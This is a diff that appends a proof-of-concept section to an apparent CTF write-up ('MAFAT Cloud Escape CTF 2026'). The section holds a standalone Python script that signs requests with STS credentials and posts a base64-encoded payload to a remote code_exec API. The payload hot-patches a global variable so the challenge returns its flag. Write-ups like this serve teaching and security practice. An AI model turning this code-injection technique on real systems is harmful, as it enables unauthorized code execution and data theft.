@@ -701,3 +701,57 @@ gantt
 <div align="center">
   <i>Agent freecandy — MAFAT Cloud Escape CTF 2026 — End of Report</i>
 </div>
+
+
+---
+
+## Proof of Concept (PoC) Exploit
+
+The following is the complete standalone Python script to automatically exploit the race condition and extract the flag via the `_ad_json` global namespace patch.
+
+```python
+#!/usr/bin/env python3
+# Stage 2: Code Execution & Global Namespace Hot-Patch PoC
+
+import base64
+import requests
+import json
+from aws_requests_auth.aws_auth import AWSRequestsAuth
+
+# 1. Configure STS Credentials (Obtained from previous steps)
+auth = AWSRequestsAuth(
+    aws_access_key='<YOUR_ACCESS_KEY>',
+    aws_secret_access_key='<YOUR_SECRET_KEY>',
+    aws_token='<YOUR_SESSION_TOKEN>',
+    aws_host='l8ssyaz69f.execute-api.us-east-1.amazonaws.com',
+    aws_region='us-east-1',
+    aws_service='execute-api'
+)
+
+# 2. The Exploit Payload: Patching the global namespace
+payload = '''
+import json
+global _ad_json
+_ad_json = json
+print(1)
+'''
+
+# 3. Base64 Encode the payload
+encoded_payload = base64.b64encode(payload.encode()).decode()
+
+# 4. Trigger Exploit
+print("[*] Sending exploit payload to /dev/code_exec...")
+response = requests.post(
+    'https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec',
+    json={'code': encoded_payload},
+    auth=auth
+)
+
+if response.status_code == 200:
+    data = response.json()
+    print("[+] Exploit Successful!")
+    print(f"[+] Recovered Flag: {data.get('ctf_out', {}).get('f_value')}")
+else:
+    print(f"[-] Exploit Failed. HTTP {response.status_code}")
+    print(response.text)
+```
